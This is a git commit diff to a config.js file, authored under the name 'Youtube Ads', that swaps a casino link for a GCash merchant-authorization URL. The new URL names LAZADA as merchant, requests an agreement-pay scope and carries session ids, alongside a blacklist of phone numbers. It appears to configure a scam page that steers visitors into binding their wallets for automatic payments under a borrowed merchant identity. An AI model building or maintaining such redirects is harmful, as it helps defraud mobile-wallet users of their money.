2803e329ce131e58ac5b00672da42819f698e356
Youtube Ads <cashonvids@gmail.com>
2026-03-27 10:29:58 +0800

    Update config.js

--- config.js
+++ config.js
@@ -10,4 +10,4 @@ window.BLACKLISTED_NUMBERS = [
     '09264008526'
 ];
 
-window.LATEST_GCASH_URL = "https://casinoplus.com.ph/";
+window.LATEST_GCASH_URL = "https://m.gcash.com/gcashapp/gcash-merchants-auth/index.html?acqSiteId=2071216300000000&clientId=2018062511204800000679&merchantId=2163400000000013&merchantName=LAZADA&netAuthId=2026032719074400000310018303357&paySiteId=1022170000000000000&redirectUrl=https://open-ph.alipay.com/api/alipay/channel/gn/gcashmini/binding-callback.htm&scopes=AUTH_AGREEMENTPAY&state=2026032719031313002440049125067&terminalType=WEB&signature=$sign#/";
